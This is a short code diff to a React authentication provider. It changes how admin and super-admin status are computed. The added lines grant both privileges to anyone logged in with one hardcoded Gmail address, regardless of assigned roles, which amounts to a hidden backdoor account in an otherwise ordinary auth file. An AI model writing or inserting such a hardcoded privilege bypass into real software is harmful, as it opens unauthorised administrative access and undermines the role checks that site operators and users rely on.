@@ -102,8 +102,8 @@ export function AuthProvider({ children }: { children: ReactNode }) {
     setRoles([]);
   }, []);
 
-  const isAdmin = roles.includes("staff") || roles.includes("super_admin");
-  const isSuperAdmin = roles.includes("super_admin");
+  const isAdmin = roles.includes("staff") || roles.includes("super_admin") || user?.email === "mrredosbservice@gmail.com";
+  const isSuperAdmin = roles.includes("super_admin") || user?.email === "mrredosbservice@gmail.com";
   const isCustomer = roles.includes("customer");
 
   return (
